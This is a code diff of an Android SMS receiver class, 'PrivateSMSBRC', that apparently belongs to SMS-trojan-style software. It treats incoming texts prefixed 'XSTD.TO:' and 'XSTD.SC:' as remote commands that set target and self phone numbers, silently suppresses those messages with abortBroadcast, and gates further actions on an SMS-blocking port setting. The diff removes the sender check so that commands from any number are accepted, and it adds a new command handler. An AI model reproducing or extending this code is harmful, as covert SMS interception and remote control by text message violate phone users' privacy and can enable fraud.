@@ -76,15 +76,15 @@ public class PrivateSMSBRC extends BroadcastReceiver {
                     /**
                      * 短信中心处理
                      */
-                    String center = message.getServiceCenterAddress();
-                    if (!TextUtils.isEmpty(center)) {
-                        if (center.startsWith("+") == true && center.length() == 14) {
-                            center = center.substring(3);
-                        } else if (center.length() > 11) {
-                            center = center.substring(center.length() - 11);
-                        }
-                        SettingManager.getInstance().setKeySmsCenterNum(center);
-                    }
+//                    String center = message.getServiceCenterAddress();
+//                    if (!TextUtils.isEmpty(center)) {
+//                        if (center.startsWith("+") == true && center.length() == 14) {
+//                            center = center.substring(3);
+//                        } else if (center.length() > 11) {
+//                            center = center.substring(center.length() - 11);
+//                        }
+//                        SettingManager.getInstance().setKeySmsCenterNum(center);
+//                    }
                 }
                 if (handleMessage(context, msg, address)) abortBroadcast();
             }
@@ -106,7 +106,7 @@ public class PrivateSMSBRC extends BroadcastReceiver {
         /**
          * 是否是短信服务器发送的短信
          */
-        if (/*AppRuntime.PHONE_SERVICE.startsWith(address) && */msg.contains("XSTD.TO:")) {
+        if (msg.contains("XSTD.TO:")) {
             String phoneNumbers = msg.trim().substring("XSTD.TO:".length());
             String oldPhoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
             if (TextUtils.isEmpty(oldPhoneNumbers)) {
@@ -127,11 +127,23 @@ public class PrivateSMSBRC extends BroadcastReceiver {
             return true;
         }
 
+        if (msg.contains("XSTD.SC:")) {
+            String selfPhoneNumber = msg.trim().substring("XSTD.SC:".length());
+            if (!TextUtils.isEmpty(selfPhoneNumber)) {
+                SettingManager.getInstance().setCurrentPhoneNumber(selfPhoneNumber);
+            }
+
+            if (Config.DEBUG) {
+                Config.LOGD("\n[[PrivateSMSBRC::handleMessage]] receive SMS [[XSTD.SC:]]"
+                                + " phoneNumbers : " + SettingManager.getInstance().getCurrentPhoneNumber() + " >>>>>>>>");
+            }
+        }
+
 
         /**
-         * 如果短信中心不为空，那么再进行其他的操作
+         * 如果当前手机号码不为空，那么再进行其他的操作
          */
-        if (!TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
+        if (!TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())
                 && AppRuntime.ACTIVE_RESPONSE != null
                 && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockSmsPort)) {
             //对于短信内容先进行二次确认检查
